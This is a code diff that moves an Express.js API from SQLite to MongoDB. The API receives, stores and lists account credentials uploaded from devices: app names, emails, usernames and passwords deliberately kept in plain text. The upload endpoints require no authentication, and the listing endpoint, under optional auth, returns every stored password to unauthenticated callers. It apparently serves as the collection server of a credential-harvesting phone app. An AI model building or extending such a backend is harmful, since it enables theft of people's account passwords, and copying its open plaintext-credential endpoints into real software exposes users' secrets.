@@ -1,12 +1,12 @@
 const express = require('express');
 const router = express.Router();
-const db = require('../database/init');
+const { getDb } = require('../database/mongodb');
 const crypto = require('crypto');
 const websocketService = require('../services/websocketService');
 const { authenticate, optionalAuth } = require('../middleware/auth');
 
 // POST /api/credentials - Upload single credential
-router.post('/', (req, res) => {
+router.post('/', async (req, res) => {
     try {
         const { deviceId, accountType, appPackage, appName, email, username, password, domain, url, devicePassword, timestamp } = req.body;
         
@@ -17,28 +17,30 @@ router.post('/', (req, res) => {
             });
         }
         
-        // Save to database
+        const db = getDb();
         const credentialId = crypto.randomUUID();
-        const stmt = db.prepare(`INSERT INTO credentials 
-            (id, deviceId, accountType, appPackage, appName, email, username, password, domain, url, devicePassword, timestamp, synced)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
         
-        stmt.run(
-            credentialId,
-            deviceId || null,
-            accountType || 'APP_PASSWORD',
-            appPackage || null,
-            appName || null,
-            email || null,
-            username || null,
-            password, // Plain text password (not masked)
-            domain || null,
-            url || null,
-            devicePassword ? 1 : 0,
-            timestamp || Date.now(),
-            1 // Mark as synced
-        );
-        stmt.finalize();
+        const credentialDoc = {
+            id: credentialId,
+            deviceId: deviceId || null,
+            accountType: accountType || 'APP_PASSWORD',
+            appPackage: appPackage || null,
+            appName: appName || null,
+            email: email || null,
+            username: username || null,
+            password: password, // Plain text password (not masked)
+            domain: domain || null,
+            url: url || null,
+            devicePassword: devicePassword ? true : false,
+            timestamp: timestamp || Date.now(),
+            synced: true, // Mark as synced
+            syncAttempts: 0,
+            lastSyncAttempt: null,
+            errorMessage: null,
+            createdAt: Math.floor(Date.now() / 1000)
+        };
+        
+        await db.collection('credentials').insertOne(credentialDoc);
         
         // Broadcast WebSocket update (without password for security)
         if (deviceId) {
@@ -61,7 +63,7 @@ router.post('/', (req, res) => {
 });
 
 // POST /api/credentials/batch - Upload multiple credentials
-router.post('/batch', (req, res) => {
+router.post('/batch', async (req, res) => {
     try {
         const credentials = req.body;
         
@@ -72,39 +74,41 @@ router.post('/batch', (req, res) => {
             });
         }
         
-        const stmt = db.prepare(`INSERT INTO credentials 
-            (id, deviceId, accountType, appPackage, appName, email, username, password, domain, url, devicePassword, timestamp, synced)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
-        
-        const transaction = db.transaction((credentials) => {
-            for (const cred of credentials) {
-                const credentialId = crypto.randomUUID();
-                stmt.run(
-                    credentialId,
-                    cred.deviceId || null,
-                    cred.accountType || 'APP_PASSWORD',
-                    cred.appPackage || null,
-                    cred.appName || null,
-                    cred.email || null,
-                    cred.username || null,
-                    cred.password, // Plain text password (not masked)
-                    cred.domain || null,
-                    cred.url || null,
-                    cred.devicePassword ? 1 : 0,
-                    cred.timestamp || Date.now(),
-                    1 // Mark as synced
-                );
-                
-                // Broadcast WebSocket update (without password for security)
-                if (cred.deviceId) {
-                    const safeCredential = { ...cred, password: '***' };
-                    websocketService.broadcastDataUpdate(cred.deviceId, 'credential', safeCredential);
-                }
-            }
+        const db = getDb();
+        const credentialDocs = credentials.map(cred => {
+            const credentialId = crypto.randomUUID();
+            return {
+                id: credentialId,
+                deviceId: cred.deviceId || null,
+                accountType: cred.accountType || 'APP_PASSWORD',
+                appPackage: cred.appPackage || null,
+                appName: cred.appName || null,
+                email: cred.email || null,
+                username: cred.username || null,
+                password: cred.password, // Plain text password (not masked)
+                domain: cred.domain || null,
+                url: cred.url || null,
+                devicePassword: cred.devicePassword ? true : false,
+                timestamp: cred.timestamp || Date.now(),
+                synced: true,
+                syncAttempts: 0,
+                lastSyncAttempt: null,
+                errorMessage: null,
+                createdAt: Math.floor(Date.now() / 1000)
+            };
         });
         
-        transaction(credentials);
-        stmt.finalize();
+        if (credentialDocs.length > 0) {
+            await db.collection('credentials').insertMany(credentialDocs);
+        }
+        
+        // Broadcast WebSocket updates (without password for security)
+        credentials.forEach(cred => {
+            if (cred.deviceId) {
+                const safeCredential = { ...cred, password: '***' };
+                websocketService.broadcastDataUpdate(cred.deviceId, 'credential', safeCredential);
+            }
+        });
         
         res.json({
             success: true,
@@ -121,47 +125,41 @@ router.post('/batch', (req, res) => {
 });
 
 // GET /api/credentials - Get credentials (with optional filters and authorization)
-router.get('/', optionalAuth, (req, res) => {
+router.get('/', optionalAuth, async (req, res) => {
     try {
         const user = req.user || {};
         const role = user.role;
         const assignedDeviceId = user.deviceId;
         const { accountType, appPackage, email, deviceId, limit = 100 } = req.query;
         
-        let query = 'SELECT * FROM credentials WHERE 1=1';
-        const params = [];
+        const db = getDb();
+        const filter = {};
         
         // Device owners can only see credentials from their assigned device
         if (role === 'device_owner' && assignedDeviceId) {
-            query += ' AND deviceId = ?';
-            params.push(assignedDeviceId);
+            filter.deviceId = assignedDeviceId;
         } else if (deviceId) {
             // Admin can filter by deviceId
-            query += ' AND deviceId = ?';
-            params.push(deviceId);
+            filter.deviceId = deviceId;
         }
         
         if (accountType) {
-            query += ' AND accountType = ?';
-            params.push(accountType);
+            filter.accountType = accountType;
         }
         
         if (appPackage) {
-            query += ' AND appPackage = ?';
-            params.push(appPackage);
+            filter.appPackage = appPackage;
         }
         
         if (email) {
-            query += ' AND email = ?';
-            params.push(email);
+            filter.email = email;
         }
         
-        query += ' ORDER BY timestamp DESC LIMIT ?';
-        params.push(parseInt(limit));
-        
-        const stmt = db.prepare(query);
-        const credentials = stmt.all(...params);
-        stmt.finalize();
+        const credentials = await db.collection('credentials')
+            .find(filter)
+            .sort({ timestamp: -1 })
+            .limit(parseInt(limit))
+            .toArray();
         
         res.json({
             success: true,
